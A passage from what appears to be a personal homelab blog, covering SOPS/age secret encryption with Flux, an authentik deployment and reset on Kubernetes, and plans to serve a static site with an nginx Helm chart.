<span id="cb56-44">                password: ENC[AES256_GCM,data:QZgcD4a+wqktN7c9mmHWicFjTDm8ZDdDx41LdMEBEeABjQ==,iv:63TiPtJYywkIZwldp4PQcU3WzHKAYRGwqo/JtwE3eb8=,tag:sAE1dlWH11LFwH7/Fbk0Iw==,type:str]</span>
<span id="cb56-45">        redis:</span>
<span id="cb56-46">            enabled: true</span>
<span id="cb56-47">sops:</span>
<span id="cb56-48">    kms: []</span>
<span id="cb56-49">    gcp_kms: []</span>
<span id="cb56-50">    azure_kv: []</span>
<span id="cb56-51">    hc_vault: []</span>
<span id="cb56-52">    age:</span>
<span id="cb56-53">        - recipient: age1sg3u7ndj045gzv3u4w5t5kntplg6sz2hv6k3uxpxq85vtx56rc4s8q83gr</span>
<span id="cb56-54">          enc: |</span>
<span id="cb56-55">            -----BEGIN AGE ENCRYPTED FILE-----</span>
<span id="cb56-56">            YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IFgyNTUxOSBNdXVSa0FtTVFNV01iUndk</span>
<span id="cb56-57">            RklNNk02OFVxVVQ3RUZyUnFvTWFaUHpVNlhRCkdSUUpVdnBBU3JiSndZeFpPVlFx</span>
<span id="cb56-58">            OXpLcmhYSjJ1czI4QzFCZFdrcis3QWMKLS0tIFB5ZlQ4TytpNkEyUFJQUWs4VE4w</span>
<span id="cb56-59">            dzkzS0tMbjFzRitKbkpKVFg0a0owOXcKvSBlZmn4pocBHrc5QbUNA5W3p5kiRaYM</span>
<span id="cb56-60">            08eMw2rCn5f6hvB2uEoImiSaKQjThmgWLcCRL4kOB+itrto6b4wC0A==</span>
<span id="cb56-61">            -----END AGE ENCRYPTED FILE-----</span>
<span id="cb56-62">    lastmodified: "2024-11-20T06:54:32Z"</span>
<span id="cb56-63">    mac: ENC[AES256_GCM,data:BsAJJcQe2W0OObtlrJLmZZ1cgExRJ8Qpm/2p2oUXOQAHkK1K6Jc1ZeHTo7sTZaSQVxcMUFkdA/s9eRsTQ8dUcsI/rLLbzQXqlKjmre/ZDhjcNoevr2X4GTacso3koIcCrkdnO1X0mZC1q9C6myv5BQ4KbjCDjCO50FIrrFsoMW0=,iv:roIs3cREdk2tVX/Fatm1AC7JfyrSRORlmYM5muceQP4=,tag:pk+3z0ztaN+cHzd3cCQUMA==,type:str]</span>
<span id="cb56-64">    pgp: []</span>
<span id="cb56-65">    encrypted_regex: ^(secret_key|password)$</span>
<span id="cb56-66">    version: 3.9.1</span></code></pre></div>
<p>Although this looks like the best setup, I don’t know if it works, maybe only kubernetes secrets can be decrypted? I will have to apply it to test.,</p>
<p>Yup, this indeed fails:</p>
<pre><code>[moonpie@cachyos-x8664 authentik]$ flux get all
NAME                            REVISION                SUSPENDED       READY   MESSAGE
gitrepository/flux-system       main@sha1:bb1f1636      False           True    stored artifact for revision 'main@sha1:bb1f1636'

NAME                            REVISION                SUSPENDED       READY   MESSAGE                                                                                                       
kustomization/flux-system       main@sha1:ca8f3c07      False           False   HelmRelease/default/authentik dry-run failed: failed to create typed patch object (default/authentik; helm.toolkit.fluxcd.io/v2, Kind=HelmRelease): .sops: field not declared in schema</code></pre>
<p>I think I need to create a “kustomization” in order to automatically decrypt secrets.</p>
<div class="sourceCode" id="cb58" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb58-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb58-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> kustomize.toolkit.fluxcd.io/v1</span></span>
<span id="cb58-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Kustomization</span></span>
<span id="cb58-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb58-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> my-secrets</span></span>
<span id="cb58-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> flux-system</span></span>
<span id="cb58-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb58-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">decryption</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb58-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">provider</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> sops</span></span>
<span id="cb58-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">secretRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb58-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> sops-age</span></span>
<span id="cb58-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 10m0s</span></span>
<span id="cb58-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ./</span></span>
<span id="cb58-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">prune</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span>
<span id="cb58-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb58-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GitRepository"</span></span>
<span id="cb58-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"flux-system"</span></span></code></pre></div>
<p>But, even after applying this, it still doesn’t work.</p>
<p><a href="https://blog.sldk.de/2021/03/handling-secrets-in-flux-v2-repositories-with-sops/">One relevant blog post</a> suggests making a similar edit… to the autogenerated flux yaml files.</p>
<p><a href="https://hackernoon.com/how-to-handle-kubernetes-secrets-with-argocd-and-sops-r92d3wt1">Another blog post</a> creates a custom argocd dockerfile…</p>
<p>According to a <a href="https://github.com/fluxcd/flux2/issues/4075">GitHub issue</a>, Flux does not, and will not support sops encryption of files directly. In fact, the user there claims that only secrets support decryption.</p>
<p>I think I need to separate out my sensitive data in to a secret, and then do sops on that secret. However, I’m confused on how to do this, especially since the fluxcd docs do not make it very clear.</p>
<p>I created a secret:</p>
<div class="sourceCode" id="cb59" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb59-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> v1</span></span>
<span id="cb59-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Secret</span></span>
<span id="cb59-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb59-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> authentik-secrets</span></span>
<span id="cb59-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb59-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Opaque</span></span>
<span id="cb59-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">stringData</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb59-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">  values.yaml</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb59-9">    authentik:</span>
<span id="cb59-10">      secret_key: "PleaseGenerateASecureKey"</span>
<span id="cb59-11">      postgresql:</span>
<span id="cb59-12">        password: "ThisIsNotASecurePassword"</span>
<span id="cb59-13">    postgresql:</span>
<span id="cb59-14">      auth:</span>
<span id="cb59-15">        password: "ThisIsNotASecurePassword"</span></code></pre></div>
<p>But one thing I really, really dislike about this setup is how I cannot encrypt just the values of the secrets I desire to encrypt. Instead, I am forced to encyrpt the whole yaml thing, which I think would make it difficult to rotate individual passwords/keys later on.</p>
<p>Is there a secret encryption/storing method that:</p>
<ul>
<li>Is minimal (no vault)</li>
<li>Runs locally (no GCP or AWS or other cloud services)</li>
<li>Securely stores individual keys</li>
</ul>
<p>But that’s off topic, back to sops.</p>
<p>I can encrypt this with:</p>
<pre><code>sops --age=age1sg3u7ndj045gzv3u4w5t5kntplg6sz2hv6k3uxpxq85vtx56rc4s8q83gr \
--encrypt --encrypted-regex '^(values.yaml)$'</code></pre>
<p>And then I get an encrypted file:</p>
<div class="sourceCode" id="cb61" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb61-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> v1</span></span>
<span id="cb61-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Secret</span></span>
<span id="cb61-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb61-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> authentik-secrets</span></span>
<span id="cb61-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb61-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Opaque</span></span>
<span id="cb61-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">stringData</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb61-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">values.yaml</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ENC[AES256_GCM,data:KiY+8u181696Bq+xSa+kpcHJLdUFmi69isy5FCV2hPdQI8BuqGRxzFnffZwcKwoBCcBDbEhCJj/ReJr62F+AZ2vG84v/FNlQVn9SXZKHHrB0abkIHczIbqne9ZPFakGWAszB9k1/Weg/YD6XpdZAudDgI7XZSxaDlPq4dLbylKh/6Gqi2WRnCF/CO09v8lqAVN5+hiUsflnmtsztt9KqgeTc01hxsoiB,iv:QbcFLLERkx6NWq1PlFu9ZNEYaOiV9GRhLNdNYzPKObQ=,tag:l88TF3ve1UolANDPzat+7Q==,type:str]</span></span>
<span id="cb61-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sops</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb61-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kms</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[]</span></span>
<span id="cb61-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">gcp_kms</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[]</span></span>
<span id="cb61-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">azure_kv</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[]</span></span>
<span id="cb61-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hc_vault</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[]</span></span>
<span id="cb61-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">age</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb61-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">recipient</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> age1sg3u7ndj045gzv3u4w5t5kntplg6sz2hv6k3uxpxq85vtx56rc4s8q83gr</span></span>
<span id="cb61-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">          enc</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb61-17">            -----BEGIN AGE ENCRYPTED FILE-----</span>
<span id="cb61-18">            YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IFgyNTUxOSBPOFY0dm1URVVHRHJPOENQ</span>
<span id="cb61-19">            ZjE4VVUvVENqWXlZcWZ2WmVTQ1QzZ1IwVlFnCnI1enhTUlVMRkd2dHFpTE9zNkg0</span>
<span id="cb61-20">            Ris3UGFlb05oSjFJMkF2U3NrM3N6THcKLS0tIDZWdzVCSGRKaFBCbFovTzlPQ2lC</span>
<span id="cb61-21">            NGppWEUwT0ozUTJielV3eWhRdVU1YncKGbw+KrkAHbxoqGL0s83ORBcM+ruHNLpp</span>
<span id="cb61-22">            EbT4xhvQ5e0Ni69K5hElmMUXJfazNU9FYhnVzTaQgC8GTWqxfwvtNA==</span>
<span id="cb61-23">            -----END AGE ENCRYPTED FILE-----</span>
<span id="cb61-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">lastmodified</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2024-11-22T22:14:54Z"</span></span>
<span id="cb61-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mac</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ENC[AES256_GCM,data:nUv/tBzTOZMXouO4uYNi7Q3OQWc+Ba7w6eZ8OLdlcFr3RdCerC9unwr/l9PGttP+za8x8Lf6GQUvhdVx4dJy8FwPcunns6gsLTkTIw83cSXmE2FUGRT/JxirI60r5WQVbzm5XZpGe3ayZMItQ5tmCrvnCXyRRJbthF6OYn4ksFs=,iv:/lX5itdXbPuDo9qYTLz0GS6GtbrtHnhNg6OApnvyTPE=,tag:gIzFvyQ6dpg99ZRXocbD9A==,type:str]</span></span>
<span id="cb61-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pgp</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[]</span></span>
<span id="cb61-27"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">encrypted_regex</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ^(values.yaml)$</span></span>
<span id="cb61-28"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">version</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">3.9.1</span></span></code></pre></div>
<p>And this file seems to decrypt properly in the kubernetes system:</p>
<div class="sourceCode" id="cb62" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb62-1">[moonpie@cachyos-x8664 authentik]$ kubectl get secrets authentik-secrets -o jsonpath="{.data.values\.yaml}"</span>
<span id="cb62-2">YXV0aGVudGlrOgogIHNlY3JldF9rZXk6ICJQbGVhc2VHZW5lcmF0ZUFTZWN1cmVLZXkiCiAgcG9zdGdyZXNxbDoKICAgIHBhc3N3b3JkOiAiVGhpc0lzTm90QVNlY3VyZVBhc3N3b3JkIgpwb3N0Z3Jlc3FsOgogIGF1dGg6CiAgICBwYXNzd29yZDogIlRoaXNJc05vdEFTZWN1cmVQYXNzd29yZCIK</span>
<span id="cb62-3">[moonpie@cachyos-x8664 authentik]$ kubectl get secrets authentik-secrets -o jsonpath="{.data.values\.yaml}" | base64 -d</span>
<span id="cb62-4">authentik:</span>
<span id="cb62-5">  secret_key: "PleaseGenerateASecureKey"</span>
<span id="cb62-6">  postgresql:</span>
<span id="cb62-7">    password: "ThisIsNotASecurePassword"</span>
<span id="cb62-8">postgresql:</span>
<span id="cb62-9">  auth:</span>
<span id="cb62-10">    password: "ThisIsNotASecurePassword"</span>
<span id="cb62-11">[moonpie@cachyos-x8664 authentik]$</span></code></pre></div>
<p>After this, I need to change my original passwords to something more secure. So now, I need to reset the service.</p>
<p>Once my passwords are encypted, I can easily view them since they aren’t encrypted on the kubernetes cluster, merely base64 encoded.</p>
<div class="sourceCode" id="cb63" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb63-1">[moonpie@cachyos-x8664 flux-config]$ kubectl get secret authentik-secrets -o jsonpath='{.data.values\.yaml}' | base64 -d</span>
<span id="cb63-2">authentik:</span>
<span id="cb63-3">  secret_key: "REDACTED"</span>
<span id="cb63-4">  postgresql:</span>
<span id="cb63-5">    password: "REDACTED"</span>
<span id="cb63-6">postgresql:</span>
<span id="cb63-7">  auth:</span>
<span id="cb63-8">    password: "REDACTED"</span></code></pre></div>
<pre><code>[moonpie@cachyos-x8664 flux-config]$ flux suspend source git flux-system
► suspending source git flux-system in flux-system namespace
✔ source git suspended
[moonpie@cachyos-x8664 flux-config]$ kubectl delete helmreleases.helm.toolkit.fluxcd.io authentik
helmrelease.helm.toolkit.fluxcd.io "authentik" deleted</code></pre>
<p>Then after this, authentik will undeploy itself, so I can redeploy itself.</p>
<div class="sourceCode" id="cb65" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb65-1">kubectl delete -n default persistentvolumeclaims redis-data-authentik-redis-master-0</span>
<span id="cb65-2"></span>
<span id="cb65-3">kubectl delete -n default persistentvolumeclaims data-authentik-postgresql-0</span>
<span id="cb65-4"></span>
<span id="cb65-5">kubectl delete -n persistentvolumes &lt;persistenvoluem1/2 here&gt;</span></code></pre></div>
<p>After all of this, authentik is put up again. I created the initial default admin account (which you can do so by going to yoursite.com/if/flow/initial-setup/), and now I need to set up self enrollment.</p>
<p>I then followed the <a href="https://docs.goauthentik.io/docs/users-sources/user/invitations">authentik docs for setting up invitations</a>.</p>
<p>I got an error, though “No invitation stage is bound to any flow. Invitations will not work as expected.” To fix I had to follow steps from a <a href="https://github.com/goauthentik/authentik/issues/9719#issuecomment-2468981069">github issue</a></p>
<p>Except it’s like this:</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><img src="./projects/build-server-5/images/invite_bad.png" class="img-fluid figure-img"></p>
<figcaption>An image of the authentik invite page. The fields are in the order of “password”, “username”, and then “password (repeat)</figcaption>
</figure>
</div>
<p>I find this mildly annoying, but I also worry that this may hint at future problems. Authentik seems to be a <strong>very</strong> flexible piece of software.</p>
<p>Later on, I decided to move authentik to it’s own namespace, and replace Issuer with ClusterIssuers.</p>
<pre><code>42m         Normal    WaitingForApproval      certificaterequest/sso-acme-1                               Not signing CertificateRequest until it is Approved
42m         Normal    IssuerNotFound          certificaterequest/sso-acme-1                               Referenced "Issuer" not found: issuer.cert-manager.io "letsencrypt-prod" not found
42m         Normal    IssuerNotFound          certificaterequest/sso-acme-1                               Referenced "Issuer" not found: issuer.cert-manager.io "letsencrypt-prod" not found
42m         Normal    Issuing                 certificate/sso-acme                                        Issuing certificate as Secret does not exist</code></pre>
<p>I have to the annotations from …</p>
</section>
</section>
<section id="static-site" class="level2">
<h2 class="anchored" data-anchor-id="static-site">Static Site</h2>
<p>I want to move my blog over to my own domain name. I think the easiest way to do this is. When <a href="https://quarto.org/">quarto</a>, the static site I use “publishes”, what it actually does is push a copy of the compiled static site to another git branch, gh-pages. Github automatically reads from that branch and serves the site at <code>*.github.io</code> domains.</p>
<p>I think I can do something similar with:</p>
<ul>
<li>Flux git source that automatically pulls from that same branch every so often</li>
<li>Web server that mounts the git repo as a volume and serves from it.</li>
</ul>
<p>There is also this <a href="https://git.gay/gitgay/pages-server">forgejo static site server</a>, but I’m not going to be looking at that for now.</p>
<p>I also am searching for some static site premade deployment that can pull from a helm chart.</p>
<ul>
<li><a href="https://gimlet.io/docs/frontend/static-site-deployment-tutorial">Gimlet</a> — this looks really complex, but looks like it does what I want.</li>
<li>some nginx + curl solution, <a href="https://github.com/redhat-cop/helm-charts/tree/main/charts/static-site" class="uri">https://github.com/redhat-cop/helm-charts/tree/main/charts/static-site</a>, <a href="https://artifacthub.io/packages/helm/redhat-cop/static-site">artifacthub</a> — I really like this solution, but it doesn’t seem to be maintained. Artifiacthub reports security vulnerabilities in the older containers used.</li>
</ul>
<p>Ah, I think I found something that works best: <a href="https://artifacthub.io/packages/helm/bitnami/nginx" class="uri">https://artifacthub.io/packages/helm/bitnami/nginx</a></p>
<p>It took some effort to figure this one out.</p>
<div class="sourceCode" id="cb67" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb67-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb67-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> source.toolkit.fluxcd.io/v1</span></span>
<span id="cb67-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb67-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb67-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> nginx</span></span>
<span id="cb67-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb67-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb67-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> oci</span></span>
